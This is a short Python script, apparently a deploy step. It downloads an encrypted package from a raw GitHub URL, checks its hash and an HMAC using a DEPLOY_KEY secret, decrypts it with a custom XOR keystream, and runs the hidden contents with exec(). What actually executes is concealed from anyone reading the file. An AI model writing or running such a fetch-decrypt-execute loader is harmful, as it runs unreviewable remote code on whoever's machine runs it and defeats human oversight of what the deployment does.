import hashlib, hmac, json, os, sys, urllib.request
URL = 'https://raw.githubusercontent.com/niithinlk-hub/indian_breakout_scanner/claude/cool-cannon-2qua2u/medhaalpha_research/medhasuryan/payload.enc'
SHA = '43b9fcecfb9d4f2082ac60a00537808d8e587dfc43333a40cd8891034280bef8'
KEY = bytes.fromhex(os.environ['DEPLOY_KEY'])
blob = urllib.request.urlopen(URL, timeout=60).read()
if hashlib.sha256(blob).hexdigest() != SHA:
    print('ABORT: the package fingerprint differs; nothing done', flush=True)
    sys.exit(1)
n, m, c = blob[:16], blob[16:48], blob[48:]
if not hmac.compare_digest(hmac.new(KEY, n + c, hashlib.sha256).digest(), m):
    print('ABORT: the key does not open the package; nothing done', flush=True)
    sys.exit(1)
out = bytearray(len(c))
for i in range(0, len(c), 32):
    ks = hashlib.sha256(KEY + n + (i // 32).to_bytes(8, 'big')).digest()
    chunk = c[i:i + 32]
    out[i:i + len(chunk)] = bytes(a ^ b for a, b in zip(chunk, ks))
d = json.loads(bytes(out))
print('package opened', flush=True)
exec(compile(d['script'], 'deploy_write', 'exec'), {'__name__': '__main__', 'PAYLOAD': json.dumps(d['payload'])})
